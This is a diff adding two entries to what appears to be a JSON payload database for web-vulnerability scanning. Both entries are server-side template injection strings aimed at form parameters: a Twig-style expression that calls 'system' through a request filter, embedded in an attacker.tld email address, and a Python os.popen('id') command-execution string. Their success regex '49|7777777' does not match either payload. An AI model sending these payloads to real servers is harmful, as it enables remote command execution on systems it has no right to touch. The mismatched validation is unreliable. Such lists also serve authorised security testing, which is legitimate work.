@@ -40170,5 +40170,27 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-243123",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "email=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "49|7777777"
+    }
+  },
+  {
+    "payload_id": "OWP-243216",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "x=os.popen('id').read()",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "49|7777777"
+    }
   }
 ]
